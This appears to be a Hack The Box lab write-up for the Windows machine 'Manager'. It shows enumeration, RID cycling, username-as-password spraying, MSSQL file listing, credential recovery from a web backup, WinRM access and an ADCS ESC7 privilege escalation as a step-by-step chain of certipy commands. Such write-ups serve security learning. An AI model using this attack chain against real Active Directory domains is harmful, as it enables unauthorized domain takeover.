## Manager
### Lab Details 

- Difficulty: Medium
- Type:  Web Enumeration, SMB, MSSQL, WinRM, Abuse Certification Authority Misconfiguration, Priv Esc, Windows

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Manager
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-18 06:22:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-18T06:24:23+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-18T06:24:23+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-09-18T06:24:23+00:00; +7h00m00s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.103.197:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.103.197:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-09-18T06:16:51
|_Not valid after:  2055-09-18T06:16:51
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2025-09-18T06:24:23+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-18T06:24:23+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
```
- visit port 80 we are presented with a basic website 
![[port 80 web app.png]]
- nothing interesting on the web app
- enumerate for `vhost` , directories and files nothing interesting found
- `SMB` service is running on the target
- however we dont have anonymous access to the shares
- we can perform `RID Cycling` to get a list of users by using `impacket-lookupsid` tool
```bash
$ impacket-lookupsid anonymous@manager.htb -no-pass
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at manager.htb
[*] StringBinding ncacn_np:manager.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
<snip>
1113: MANAGER\Zhong (SidTypeUser)
1114: MANAGER\Cheng (SidTypeUser)
1115: MANAGER\Ryan (SidTypeUser)
1116: MANAGER\Raven (SidTypeUser)
1117: MANAGER\JinWoo (SidTypeUser)
1118: MANAGER\ChinHae (SidTypeUser)
1119: MANAGER\Operator (SidTypeUser)
```
- we a get a list of normal users at the end of the list
- add that to a file 
```bash
$ cat usersnames.txt 
Zhong
Cheng
Ryan
Raven
JinWoo
ChinHae
Operator
```
- with the username we can generate a simple passwords file 
```
$ cat usersnames.txt | tr '[:upper:]' '[:lower:]' > passwords.txt; cat passwords.txt 
zhong
cheng
ryan
raven
jinwoo
chinhae
operator
```
- we can use the word-lists to attempt authentication to services running on target
- use `nxc` to enumerate through the word-lists against `SMB`
```bash
$ nxc smb 10.129.81.225 -u usersnames.txt -p passwords.txt --continue-on-success
SMB         10.129.81.225   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
<snip>
SMB         10.129.81.225   445    DC01             [+] manager.htb\Operator:operator 
```
- we get a valid credential combination `manager.htb\Operator:operator `
### Initial Foothold 
- with the valid credential we can attempt to interact with other services running on the target since we still don't admin access over `SMB`
- from the `nmap` output we see that the target is also running `mssql` server which we can interact with `impacket-mssqliclient`
- connect to the service 
```bash
$ impacket-mssqlclient 'manager.htb/Operator:operator@10.129.103.197' -windows-auth
```
- nothing in the databases 
- `impacket-mssqliclient` allows us to functions like read files in the file system using `xp_diretree`
- using `xp_diretree` to enumerate the file system on target we find a `.zip` folder located in the `wwwroot` directory which is hosting the application running on port 80
![[Medium/Windows/Manager/backup zip.png]]
- get the file using `$ wget http://10.129.103.197/website-backup-27-07-23-old.zip`
![[unzip.png]]
- going through the zipped file, we find a file named `.old-conf.xml`
![[raven cred.png]]
- in there we find credential of user `raven`
```xml
    <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
```
#### Lateral Movement (If any)
- we can use `raven` credential to enumerate services running on the target
- `raven` doesn't have access to `SMB` as admin however does have admin access over `winrm`
```bash
$ nxc winrm 10.129.103.197 -u raven -p 'R4v3nBe5tD3veloP3r!123' 
WINRM       10.129.103.197  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
WINRM       10.129.103.197  5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
```
-  we can use `evil-winrm` to get RCE on target
```bash
$ evil-winrm -i 10.129.81.225 -u raven -p 'R4v3nBe5tD3veloP3r!123'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents> 
```
#### Privilege Escalation
- we can check for Certification Authority misconfiguration using `certipy`
```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[*] Got CA configuration for 'manager-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
Certificate Templates                   : [!] Could not find any certificate templates

```
- user `raven` has dangerous permission over the target
- use below steps to exploit the vulnerability
```bash
## add Raven as an "officer", so that we can manage certificates and issue them manually.
certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.81.225 -ca manager-dc01-ca -add-officer raven -debug

##The SubCA template can beenabled on the CA with the -enable-template flag.
certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.81.225 -ca manager-dc01-ca -enable-template subca

## list enabled certificate templates
certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.81.225 -ca manager-dc01-ca -list-templates

## Now let us request a certificate based on the SubCA template. This request will be denied, but we will obtain a request ID and a private key, which we save to a file.
certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.81.225 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb

## retrieve the issued certificate with the req command and the -retrieve <requestID> parameter.
certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.81.225 -ca manager-dc01-ca -issue-request 19

## manually issue the failed certificate with the ca command and the -issue-request <request ID> parameter.
certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.81.225 -ca manager-dc01-ca -retrieve 19

## Authenticate to get NT hash
certipy auth -pfx administrator.pfx

## synchronize our clock with target if get 'KRB_AP_ERR_SKEW (Clock skew too great)' error, then rerun above command
sudo ntpdate -s manager.htb
```
- use `evil-winrm` to authenticate as admin using the hash 
#### Resources

#### Lesson Learned
- Abuse Certification Authority Misconfiguration
- RID Cycling to enumerate users
